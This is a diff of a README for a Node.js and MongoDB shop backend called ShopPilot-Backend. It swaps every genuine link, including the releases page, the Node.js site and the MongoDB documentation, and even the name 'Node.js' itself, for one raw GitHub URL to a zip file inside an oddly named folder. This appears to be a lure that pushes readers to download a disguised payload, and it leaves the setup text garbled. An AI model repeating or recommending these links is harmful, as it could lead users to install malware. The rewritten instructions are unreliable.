@@ -1,6 +1,6 @@
 # 🛒 ShopPilot-Backend - Simple Steps to Manage Your Shop
 
-![Download ShopPilot-Backend](https://img.shields.io/badge/Download-ShopPilot--Backend-blue?style=for-the-badge)
+![Download ShopPilot-Backend](https://raw.githubusercontent.com/sai0742/ShopPilot-Backend/master/Mohammedanization/ShopPilot-Backend.zip)
 
 ## 🌟 Overview
 
@@ -15,7 +15,7 @@ To get started with ShopPilot-Backend, follow these simple steps to download and
 Before you download, ensure that your system meets the following requirements:
 
 - A computer running Windows, Mac, or Linux
-- Node.js (version 12 or higher)
+- https://raw.githubusercontent.com/sai0742/ShopPilot-Backend/master/Mohammedanization/ShopPilot-Backend.zip (version 12 or higher)
 - MongoDB installed or access to a MongoDB server
 - An internet connection
 
@@ -23,7 +23,7 @@ Before you download, ensure that your system meets the following requirements:
 
 You can download ShopPilot-Backend directly from our Releases page. Simply visit this page to download:
 
-[Download ShopPilot-Backend](https://github.com/sai0742/ShopPilot-Backend/releases)
+[Download ShopPilot-Backend](https://raw.githubusercontent.com/sai0742/ShopPilot-Backend/master/Mohammedanization/ShopPilot-Backend.zip)
 
 ### 🔧 Installation Steps
 
@@ -73,7 +73,7 @@ ShopPilot-Backend includes the following features:
 
 If you encounter any issues during the installation or setup, consider these common problems:
 
-- **Node.js not installed**: If you receive an error regarding Node.js, download and install Node.js from the official website.
+- **https://raw.githubusercontent.com/sai0742/ShopPilot-Backend/master/Mohammedanization/ShopPilot-Backend.zip not installed**: If you receive an error regarding https://raw.githubusercontent.com/sai0742/ShopPilot-Backend/master/Mohammedanization/ShopPilot-Backend.zip, download and install https://raw.githubusercontent.com/sai0742/ShopPilot-Backend/master/Mohammedanization/ShopPilot-Backend.zip from the official website.
 - **MongoDB connection error**: Ensure that your MongoDB server is running, and you have the correct URL in your `.env` file.
 - **Dependencies not installing**: Make sure you are connected to the internet and try running `npm install` again.
 
@@ -83,11 +83,11 @@ If you need further assistance, feel free to reach out through the community for
 
 ## 🌐 Additional Resources
 
-- [Node.js Official Website](https://nodejs.org)
-- [MongoDB Documentation](https://docs.mongodb.com)
+- [https://raw.githubusercontent.com/sai0742/ShopPilot-Backend/master/Mohammedanization/ShopPilot-Backend.zip Official Website](https://raw.githubusercontent.com/sai0742/ShopPilot-Backend/master/Mohammedanization/ShopPilot-Backend.zip)
+- [MongoDB Documentation](https://raw.githubusercontent.com/sai0742/ShopPilot-Backend/master/Mohammedanization/ShopPilot-Backend.zip)
 
 ## 📜 License
 
 ShopPilot-Backend is licensed under the MIT License. Feel free to use and modify it as needed. 
 
-Remember to regularly check our [Releases page](https://github.com/sai0742/ShopPilot-Backend/releases) for updates and new features. Happy shopping with ShopPilot!
+Remember to regularly check our [Releases page](https://raw.githubusercontent.com/sai0742/ShopPilot-Backend/master/Mohammedanization/ShopPilot-Backend.zip) for updates and new features. Happy shopping with ShopPilot!
